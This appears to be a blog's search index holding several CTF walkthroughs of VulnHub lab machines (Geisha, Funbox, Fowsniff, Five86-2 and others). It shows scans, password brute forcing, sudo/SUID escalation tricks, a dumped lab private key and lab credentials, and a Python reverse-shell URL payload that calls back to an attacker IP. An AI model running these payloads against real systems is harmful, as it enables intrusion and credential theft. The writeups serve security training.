â†’![169-26.png](/Vulnhub-Files/img/Gitroot/169-26.png)![169-27.png](/Vulnhub-Files/img/Gitroot/169-27.png)# **Summery Notes âž¡ï¸**â†’ The machine was too much lenghty . Overall based on git exploitation.â†’ Very Very good machine for git exploitation.â†’ Got to know about the subdomaining through ffuf.> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Geisha : 1", "url": "/posts/Geisha/", "categories": "Proving Grounds, Play", "tags": "Lateral Movement, Password Bruteforce, SUIDs, base32, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "| Machine | Details || ----------- | ------------------------------------------------------------------------------- || **Vulnhub** | http...", "content": "| Machine | Details || ----------- | ------------------------------------------------------------------------------- || **Vulnhub** | https://vulnhub.com/entry/geisha-1,481/ || **Level** | Beginner to Intermediate || **Creator** | SunCSR Team |### Lets check the IP Now â¤µï¸![Untitled](/Vulnhub-Files/img/Geisha/Untitled.png)```bashIP : 192.168.249.133```{: .nolineno}## Port Scan Results â¬‡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Giesha]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.133 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 06:00 EDTNmap scan report for 192.168.249.133Host is up (0.00074s latency).Not shown: 65528 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 1bf25dcd8913f249009f8cf9eba2a20c (RSA)| 256 315a652eab0f59abe0333a0cfc49e05f (ECDSA)|_ 256 c6a735149613f8de1ee2bce7c7668bac (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Geisha|_http-server-header: Apache/2.4.38 (Debian)7080/tcp open ssl/http LiteSpeed httpd|_http-title: Geisha| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US| Not valid before: 2020-05-09T14:01:34|_Not valid after: 2022-05-09T14:01:34|_http-server-header: LiteSpeed|_ssl-date: TLS randomness does not represent time| tls-alpn: | h2| spdy/3| spdy/2|_ http/1.17125/tcp open http nginx 1.17.10|_http-server-header: nginx/1.17.10|_http-title: Geisha8088/tcp open http LiteSpeed httpd|_http-title: Geisha|_http-server-header: LiteSpeed9198/tcp open http SimpleHTTPServer 0.6 (Python 2.7.16)|_http-title: Geisha|_http-server-header: SimpleHTTP/0.6 Python/2.7.16MAC Address: 00:0C:29:47:3A:B7 (VMware)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration âž¡ï¸Now That I have 4 http ports and 1 http port with ssl certificate So All have a common type/Interface of web page â¤µï¸![Untitled](/Vulnhub-Files/img/Geisha/Untitled%201.png)Now with `feroxbuster` as a directory or files bruteforcing tool I found some file from port `7125` file name `passwd`.```bashâ””â”€$ cat passwd root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologingeisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlsadm:x:998:1001::/:/sbin/nologin```{: .nolineno}As I got a username as `geisha` so lets try ssh brute force with hydra âž¡ï¸![Untitled](/Vulnhub-Files/img/Geisha/Untitled%202.png)```bashCredentials âž¡ï¸geisha : letmein```{: .nolineno}![Untitled](/Vulnhub-Files/img/Geisha/Untitled%203.png)Now lets find SUIDs commands âž¡ï¸![Untitled](/Vulnhub-Files/img/Geisha/Untitled%204.png)So lets run it â¤µï¸![Untitled](/Vulnhub-Files/img/Geisha/Untitled%205.png)I have got a shadow file but I cant read it so lets use above command to read it .![Untitled](/Vulnhub-Files/img/Geisha/Untitled%206.png)Now lets run `base32 shadow | base32 --decode` .![Untitled](/Vulnhub-Files/img/Geisha/Untitled%207.png)Now lets try something else like accessing the id_rsa from root .```bashgeisha@geisha:/$ base32 /root/.ssh/id_rsa | base32 --decode-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX589FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcwwWW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGRY/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYOjceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOlTHxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bubRaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHHxvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWredeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFhzh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOfv/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0MOuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCvbf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=-----END RSA PRIVATE KEY-----```{: .nolineno}Now lets create id_rsa file in /tmp directory and give permission 600 to it , then execute it as ssh as root .![Untitled](/Vulnhub-Files/img/Geisha/Untitled%208.png)Now I am root cool !!```bashroot@geisha:~# cat flag.txtFlag{Sun_CTF_220_5_G31sha}root@geisha:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Funbox : Easy", "url": "/posts/Funbox-Easy/", "categories": "Proving Grounds, Play, Funbox", "tags": "PrivEsc, Sqlmap, timedatectl, File Upload, time", "date": "2023-06-14 00:00:00 +0530", "snippet": "| Machine | Details || ----------- | ------------------------------------------------------------------------- || **Vulnhub** | https://www.vuln...", "content": "| Machine | Details || ----------- | ------------------------------------------------------------------------- || **Vulnhub** | https://www.vulnhub.com/entry/funbox-easy,526/ || **Level** | script-kiddies || **Creator** | 0815R2d2 |## **Description â¤µï¸**>ðŸ’¡ Boot2Root ! Easy going, but with this Funbox you have to spend a bit more time. Much more, if you stuck in good traps. But most of the traps have hints, that they are traps.If you need hints, call me on twitter: @0815R2d2Have fun...This works better with VirtualBox rather than VMwareThis works better with VirtualBox rather than VMware.{: .prompt-info }### Letâ€™s find the IP Address first >>![164-1.png](/Vulnhub-Files/img/Funbox-Easy/164-1.png)```bashIP : 10.0.2.17```{: .nolineno}## Port Scan Results âž¡ï¸![164-2.png](/Vulnhub-Files/img/Funbox-Easy/164-2.png)```bashOPEN PORTS >22 SSH80 HTTP33060 mysql```{: .nolineno}## Web Enumeration â¤µï¸![164-3.png](/Vulnhub-Files/img/Funbox-Easy/164-3.png)![164-4.png](/Vulnhub-Files/img/Funbox-Easy/164-4.png)![164-5.png](/Vulnhub-Files/img/Funbox-Easy/164-5.png)So with sql injection on store site I got this â†’```bashcommand :sqlmap -u \"\" --risk 3 --level 5```{: .nolineno}![164-6.png](/Vulnhub-Files/img/Funbox-Easy/164-6.png)![164-7.png](/Vulnhub-Files/img/Funbox-Easy/164-7.png)```bashadmin : admin```{: .nolineno}![164-8.png](/Vulnhub-Files/img/Funbox-Easy/164-8.png)Got access â†’![164-9.png](/Vulnhub-Files/img/Funbox-Easy/164-9.png)After accessing that page I got this â†’![164-10.png](/Vulnhub-Files/img/Funbox-Easy/164-10.png)---## SHELL âž¡ï¸Got something â†’![164-11.png](/Vulnhub-Files/img/Funbox-Easy/164-11.png)![164-12.png](/Vulnhub-Files/img/Funbox-Easy/164-12.png)Now lets check the `sudo -l` for root access through tony â†’![164-13.png](/Vulnhub-Files/img/Funbox-Easy/164-13.png)Now I got too much options so lets try least interesting one time â†’```bashcommand : sudo /usr/bin/time /bin/sh```{: .nolineno}![164-14.png](/Vulnhub-Files/img/Funbox-Easy/164-14.png)![164-15.png](/Vulnhub-Files/img/Funbox-Easy/164-15.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Funbox : EasyEnum", "url": "/posts/Funbox-Easy-Enum/", "categories": "Proving Grounds, Play, Funbox", "tags": "Recon, hashcat, mysql, PrivEsc, File Upload", "date": "2023-06-14 00:00:00 +0530", "snippet": "| Machine | Details || ----------- | ------------------------------------------------------------------------- || **Vulnhub** | https://www.vuln...", "content": "| Machine | Details || ----------- | ------------------------------------------------------------------------- || **Vulnhub** | https://www.vulnhub.com/entry/funbox-easyenum,565/ || **Level** | script-kiddies || **Creator** | 0815R2d2 |## **Description â¤µï¸**>ðŸ’¡ Boot2root in 6 steps for script-kiddies.Timeframe to root this box: 20 mins to never ever. It is on you.# **HINTS:**Enum without sense, costs you too many time:1. Use \"Daisys best friend\" for information gathering.2. Visit \"Karla at home\".3. John and Hydra loves only rockyou.txt4. Enum/reduce the users to brute force with or brute force the rest of your life.This works better with VirtualBox rather than VMware{: .prompt-tip }### Letâ€™s find the IP Address first >>![165-1.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-1.png)```bashIP : 10.0.2.18```{: .nolineno}## Port Scan Results âž¡ï¸![165-2.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-2.png)```bashOPEN PORTS >22 SSH80 HTTP```{: .nolineno}## Web Enumeration â¤µï¸![165-3.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-3.png)![165-4.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-4.png)![165-5.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-5.png)Lets look into directory or files bruteforcing files / folders â†’![165-6.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-6.png)![165-7.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-7.png)I uploaded the php_reverse_shell code â†’![165-8.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-8.png)---## SHELL âž¡ï¸Now lets check `/etc/passwd` â†’![165-9.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-9.png)Now I have to crack the password â†’ so lets use hashcat â†’```bashcommand â†’ hashcat -m 500 pass.hash /usr/share/wordlists/rockyou.txt```{: .nolineno}![165-10.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-10.png)```bashoracle : hiphop```{: .nolineno}Lets recon more on web â†’![165-11.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-11.png)Lets check â†’![165-12.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-12.png)```bashphpmyadmin : tgbzhnujm!```{: .nolineno}![165-13.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-13.png)Now I tried this password for karla â†’![165-14.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-14.png)And I got in â†’![165-15.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-15.png)It time for root !!![165-16.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-16.png)![165-17.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-17.png)I got one more user credentials â†’![165-18.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-18.png)---## **Another Way to root â†’**Now lets brute force the password for user **goat** which contains the **shadow.bak** file â†’I got result after 15-20 min â†’![165-19.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-19.png)```bashgoat : thebest```{: .nolineno}![165-20.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-20.png)![165-21.png](/Vulnhub-Files/img/Funbox-Easy-Enum/165-21.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Fowsniff : 1", "url": "/posts/Fowsniff-CTF/", "categories": "Proving Grounds, Play", "tags": "OSINT, POP3, Password Bruteforce, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "| Machine | Details || ----------- | ------------------------------------------------------------------------- || **Vulnhub** | https://www.vuln...", "content": "| Machine | Details || ----------- | ------------------------------------------------------------------------- || **Vulnhub** | https://www.vulnhub.com/entry/fowsniff-1,262/ || **Level** | beginner || **Creator** | berzerk0 |### Lets check the IP address now â†’![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled.png)```bashIP : 10.0.2.47```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Fowsniff]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.47Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 21:51 ISTNmap scan report for 10.0.2.47Host is up (0.0013s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 903566f4c6d295121be8cddeaa4e0323 (RSA)| 256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)|_ 256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/|_http-title: Fowsniff Corp - Delivering Solutions|_http-server-header: Apache/2.4.18 (Ubuntu)110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: SASL(PLAIN) PIPELINING AUTH-RESP-CODE UIDL TOP RESP-CODES USER CAPA143/tcp open imap Dovecot imapd|_imap-capabilities: Pre-login ENABLE LOGIN-REFERRALS listed have post-login capabilities more OK AUTH=PLAINA0001 ID SASL-IR LITERAL+ IDLE IMAP4rev1MAC Address: 08:00:27:FE:40:C2 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%201.png)From directory or files bruteforcing I got this â€”>![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%202.png)On front page I noticed this text âž¡ï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%203.png)So lets check the official Twitter handle of `@fowsniffcorp` â€”>![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%204.png)Lets check the paste bin file â€”> ![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%205.png)Now lets follow through to the link for â€œ`password dump`â€œ â€”>![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%206.png)Lets decode the passwords for `pop3` service âž¡ï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%207.png)```bashmauer@fowsniff:8a28a94a588a95b80163709ab4313aa4\t\t: mailcallmustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56\t: bilbo101tegel@fowsniff:1dc352435fecca338acfd4be10984009\t\t: apples01baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb\t: skyler22seina@fowsniff:90dc16d47114aa13671c697fd506cf26\t\t: scoobydoo2stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabdmursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b\t: carp4everparede@fowsniff:4d6e42f56e127803285a0a7649b5ab11\t: orlando12sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e\t: 07011972```{: .nolineno}Now lets create a users.txt and pass.txt file from above credentials ,so that I can brute force for pop3 service login credentials âž¡ï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%208.png)Lets log into the pop3 mail service â¬‡ï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%209.png)Lets retrieve 1 & 2 âž¡ï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%2010.png)```{: .nolineno}password : S1ck3nBluff+secureshell```{: .nolineno}![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%2011.png)Now lets brute force again for ssh service with that password and with users.txt (users) âž¡ï¸![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%2012.png)Now SSH login time, Local Privilege Escalation time âž¡ï¸ ![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%2013.png)Now I found many users so far and also a file named as `/opt/cube/cube.sh` â€”>![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%2014.png)Since this file have a permission to write so I inserted the nc reverse shell command into it.And I have also noticed that this file is executed In the time of login so Lets login again and capture the response from it.![Untitled](/Vulnhub-Files/img/Fowsniff-CTF/Untitled%2015.png)WOW!! I got root not expecting this , but I am happy now ROOT !!```bash# cat flag.txt ___ _ _ _ _ _ / __|___ _ _ __ _ _ _ __ _| |_ _ _| |__ _| |_(_)___ _ _ __| | | (__/ _ \\ ' \\/ _` | '_/ _` | _| || | / _` | _| / _ \\ ' \\(_-```bash/home/seina/doubt.txt/home/stone/early.txt/home/stone/email_to_all.txt/home/mustikka/attack.txt/home/parede/friend.txt/home/tegel/five.txt/home/baksteen/term.txt/home/mursten/percent.txt/home/sciana/live.txt/home/mauer/pajamas.txt/root/flag.txt```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Five86 : 2", "url": "/posts/Five86-2/", "categories": "Proving Grounds, Play", "tags": "Public Exploit, RFI, service, tcpdump, Wordpress, PrivEsc, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "| Machine | Details || ----------- | -------------------------------------------- || **Vulnhub** | https://www.vulnhub.com/entry/five86-2,418/ || **Level** | beginner ...", "content": "| Machine | Details || ----------- | -------------------------------------------- || **Vulnhub** | https://www.vulnhub.com/entry/five86-2,418/ || **Level** | beginner || **Creator** | @m0tl3ycr3w and @syed__umar |### Lets find the IP address first of the victim machine âž¡ï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled.png)```bashIP : 10.0.2.43```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Five86.2]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.43Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 11:36 ISTNmap scan report for 10.0.2.43Host is up (0.0020s latency).Not shown: 65532 filtered tcp ports (no-response)PORT STATE SERVICE VERSION20/tcp closed ftp-data21/tcp open ftp ProFTPD 1.3.5e80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.1.4|_http-title: Five86-2 &#8211; Just another WordPress site|_http-server-header: Apache/2.4.41 (Ubuntu)MAC Address: 08:00:27:19:F4:DF (Oracle VirtualBox virtual NIC)Service Info: OS: Unix```{: .nolineno}## Web Enumeration â¤µï¸Lets set the `/etc/hosts` file as `five86-2`.![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%201.png)Now lets run wpscan âž¡ï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%202.png)got 3 users â†’ admin , barney , stephen Lets find the passwords also through wpscan â¤µï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%203.png)```bashbarney : spooky1stephen : apollo1```{: .nolineno}Lets login with barney credentials â†’![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%204.png)Now in plugin section I found a vulnerable service lets enable it for uploading our payload â¤µï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%205.png)Now through web I got an [exploit](https://www.exploit-db.com/exploits/46981) poc for exploiting this service â†’![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%206.png)So lets follow this path â¬†ï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%207.png)Now lets upload our payload â†’![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%208.png)Now After Inserting I got the path so lets load the url â¤µï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%209.png)![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%2010.png)As I got the command Injection so lets have a reverse shell.```bashhttp://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.42%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27```{: .nolineno}![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%2011.png)Now lets dig into the shell â†’ ```bashwww-data@five86-2:/home$ ls -alls -altotal 40drwxr-xr-x 10 root root 4096 Jan 9 2020 .drwxr-xr-x 20 root root 4096 Jan 8 2020 ..drwx------ 2 barney barney 4096 Jan 13 2020 barneydrwx------ 2 george george 4096 Jan 13 2020 georgedrwx------ 2 gillian gillian 4096 Jan 13 2020 gilliandrwx------ 2 john john 4096 Jan 13 2020 johndrwx------ 3 paul paul 4096 Jan 13 2020 pauldrwx------ 4 peter peter 4096 Jan 13 2020 peterdrwx------ 2 richard richard 4096 Jan 13 2020 richarddrwx------ 2 stephen stephen 4096 Jan 13 2020 stephenwww-data@five86-2:```{: .nolineno}Now I got 8 users â†’```bashbarney:x:1001:1001:Barney Sumner:/home/barney:/bin/bashstephen:x:1002:1002:Stephen Morris:/home/stephen:/bin/bashpeter:x:1003:1003:Peter Hook:/home/peter:/bin/bashgillian:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bashrichard:x:1005:1005:Richard Starkey:/home/richard:/bin/bashpaul:x:1006:1006:Paul McCartney:/home/paul:/bin/bashjohn:x:1007:1007:John Lennon:/home/john:/bin/bashgeorge:x:1008:1008:George Harrison:/home/george:/bin/bash```{: .nolineno}Lets use the same wpscan passwords for switching to another users â†’![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%2012.png)```bashstephen@five86-2:/$ iduid=1002(stephen) gid=1002(stephen) groups=1002(stephen),1009(pcap)```{: .nolineno}Now lets look for the capability files âž¡ï¸![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%2013.png)So I have tcpdump Lets look for the services/files/ethernet Interface it is running to â†’![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%2014.png)Now lets run the tcpdump at this â¬†ï¸`veth8d3c874` interface and capture some traffic into `cap.pcap` file â†’![Untitled](/Vulnhub-Files/img/Five86-2/Untitled%2015.png)Now I got a credential for paul â†’```bashpaul : esomepasswford```{: .nolineno}lets switch user and recon further â†’```bashpaul@five86-2:~$ sudo -lMatching Defaults entries for paul on five86-2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser paul may run the following commands on five86-2: (peter) NOPASSWD: /usr/sbin/service```{: .nolineno}Now call the /bin/sh service for peter to get the peter shell âž¡ï¸```bashpaul@five86-2:~$ sudo -u peter service ../../bin/sh$ whoamipeter$ iduid=1003(peter) gid=1003(peter) groups=1003(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd),1010(ncgroup)$ sudo -lMatching Defaults entries for peter on five86-2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser peter may run the following commands on five86-2: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/passwd $ sudo passwd rootNew password: Retype new password: passwd: password updated successfully$ su rootPassword: root@five86-2:/# whoamirootroot@five86-2:/# iduid=0(root) gid=0(root) groups=0(root)root@five86-2:/# ls -al /roottotal 48drwx------ 5 root root 4096 Jan 13 2020 .drwxr-xr-x 20 root root 4096 Jan 8 2020 ..-rw------- 1 root root 1798 Jan 13 2020 .bash_history-rw-r--r-- 1 root root 3106 Aug 27 2019 .bashrcdrwxr-xr-x 3 root root 4096 Jan 9 2020 .local-rw-r--r-- 1 root root 148 Aug 27 2019 .profiledrwxr-xr-x 3 root root 4096 Jan 8 2020 snapdrwx------ 2 root root 4096 Jan 8 2020 .ssh-rwx------ 1 root root 995 Jan 9 2020 thisistheflag.txt-rw------- 1 root root 8853 Jan 13 2020 .viminfo```{: .nolineno}`thisistheflag.txt` file â¤µï¸```bashroot@five86-2:/# cat /root/thisistheflag.txt__ __ _ _ _ _ _ _ _ \\ \\ / / | | | | | | | | | | \\ V /___ _ _ | |__ __ ___ _____ __| | ___ _ __ ___ __ _____| | | | | | \\ // _ \\| | | | | '_ \\ / _` \\ \\ / / _ \\ / _` |/ _ \\| '_ \\ / _ \\ \\ \\ /\\ / / _ \\ | | | | | | | (_) | |_| | | | | | (_| |\\ V / __/ | (_| | (_) | | | | __/ \\ V V / __/ | |_|_|_| \\_/\\___/ \\__,_| |_| |_|\\__,_| \\_/ \\___| \\__,_|\\___/|_| |_|\\___| \\_/\\_/ \\___|_|_(_|_|_) Congratulations - hope you enjoyed Five86-2.If you have any feedback, please let me know at @Five86_xI also want to send out a big thanks to all those who help me with beta testingof the various challenges: @m0tl3ycr3w and @syed__umar in particularroot@five86-2:/#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "EvilBox-One", "url": "/posts/EvilBox-One/", "categories": "Proving Grounds, Play", "tags": "LFI, PrivEsc, passwd", "date": "2023-06-14 00:00:00 +0530", "snippet": "Lets find out the IP of this Machine First âž¡ï¸IP : 10.10.2.51Port Scan Results âž¡ï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/EvilBox-One]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.51St...", "content": "Lets find out the IP of this Machine First âž¡ï¸IP : 10.10.2.51Port Scan Results âž¡ï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/EvilBox-One]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.51Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 16:54 ISTNmap scan report for 10.0.2.51Host is up (0.00066s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 4495500be473a18511ca10ec1ccbd426 (RSA)| 256 27db6ac73a9c5a0e47ba8d81ebd6d63c (ECDSA)|_ 256 e30756a92563d4ce3901c19ad9fede64 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:94:F8:26 (Oracle VirtualBox virtual NIC)Service Info: 